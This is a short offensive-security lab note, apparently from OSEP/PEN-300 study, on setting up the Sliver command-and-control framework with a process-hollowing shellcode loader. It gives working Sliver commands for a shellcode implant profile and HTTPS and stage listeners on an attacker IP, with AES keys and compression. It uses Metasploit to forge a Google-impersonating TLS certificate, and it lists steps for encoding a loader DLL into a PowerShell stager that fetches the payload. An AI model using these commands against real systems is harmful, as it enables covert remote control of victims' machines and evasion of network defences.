# Sliver Advanced Process Hollowing shellcode runner Setup

## References
All content for Sliver shell code runner from https://github.com/beauknowstech/OSEP-Everything/tree/main/AMSI
In addition, the setup was guided from https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8

## The Sliver Server setup process
{% code overflow="wrap" %}
```bash
# Create profile local64 and point to port 443
sliver > profiles new --http 192.168.45.227:443 --format shellcode local64

# Setup certs with metasploit
┌──(kali㉿kali)-[~]
└─$ msfconsole -q -x "use auxiliary/gather/impersonate_ssl; set RHOST www.google.com; run; exit"
# Then save the .crt and .key files into an appropriate folder for easy reference

# Setup main listener with google.crt / key generated with metasploit
sliver > https -L 192.168.45.227 -l 443 -c /home/kali/Desktop/PEN-300/sliver/sslCerts/google.crt -k /home/kali/Desktop/PEN-300/sliver/sslCerts/google.key

# Setup the main stager with unzip key / decryption keys 
sliver > stage-listener --url https://192.168.45.227:8064 --profile local64 -c /home/kali/Desktop/PEN-300/sliver/sslCerts/google.crt -k /home/kali/Desktop/PEN-300/sliver/sslCerts/google.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
```
{% endcode %}

# References
ToolLibrary/Sliver-ProcessHollowing-Loader

# Sliver-ProcessHollowing-Loader Setup
{% code overflow="wrap" %}
```bash
# Step 1 - Compile the .dll from the ToolLibrary/Sliver-ProcessHollowing-Loader or grab precompiled from Compiled/Sliver/SliverLoader.dll 
# Step 2 - Use the powershellEncoder.ps1 to output to SliverLoader_Base64.txt
# Step 3 - Copy and paste the contents of SliverLoader_Base64.txt into the sliver.txt $encodeStr variable
# Step 4 - Modify the runner.txt (or ps1) to reflect the kali (attacker) tun0 IP
# Step 5 - Modify the sliver.txt (or ps1) on line 7 stage-listener http address to reflect the kali (attacker) tun0 IP
```
{% endcode %}
